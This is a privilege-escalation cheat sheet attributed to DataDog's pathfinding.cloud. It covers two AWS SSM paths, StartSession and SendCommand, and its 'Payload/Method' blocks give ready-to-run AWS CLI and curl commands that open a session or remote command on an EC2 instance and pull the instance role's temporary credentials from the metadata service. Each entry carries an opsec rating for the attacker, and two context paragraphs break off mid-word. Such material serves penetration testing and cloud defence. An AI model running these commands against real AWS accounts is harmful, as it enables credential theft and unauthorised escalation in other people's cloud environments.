# SSM - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### ssm:StartSession [added: 2026-04]
- **Tags:** #Ssm #Ec2 #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; ssm + ec2 in scope
- **Prereq:** IAM perms: ssm:StartSession; EC2 instance must exist and be running
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [ssm-001] The `ssm:StartSession` permission allows a principal to remotely access any EC2 instance on which they have this permission. This access is contingent on the EC2 instance having the SSM agent installed and running, possessing the AmazonSSMManagedInstanceCore policy or equivalent permissions, and being in a running state. This permission provides SSH-like access via the AWS API. Consequently, the i
- **Payload/Method:**
```
# Step 1: Start an interactive SSM session on the target EC2 instance
aws ssm start-session --target i-XXXXXXXXXXX

# Step 2: Retrieve the role name from the instance metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 3: Steal the temporary credentials for the instance's IAM role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME
```

### ssm:SendCommand [added: 2026-04]
- **Tags:** #Ssm #Ec2 #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; ssm + ec2 in scope
- **Prereq:** IAM perms: ssm:SendCommand; EC2 instance must exist and be running
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [ssm-002] The `ssm:SendCommand` permission allows a principal to execute commands on any EC2 instance on which they have this permission, using SSM Run Command. This access is contingent on the EC2 instance having the SSM agent installed, possessing the AmazonSSMManagedInstanceCore policy (or equivalent permissions), and being in a running state. If an instance has a privileged IAM role attached, an attacke
- **Payload/Method:**
```
# Step 1: Send a command to steal the IAM role credentials from instance metadata
aws ssm send-command --instance-ids "i-XXXXXXXXXXX" --document-name "AWS-RunShellScript" --comment "Stealing IAM credentials" --parameters commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME"]

# Step 2: Retrieve the command output containing the temporary credentials
aws ssm get-command-invocation --command-id @command-id --instance-id i-XXXXXXXXXXX
```
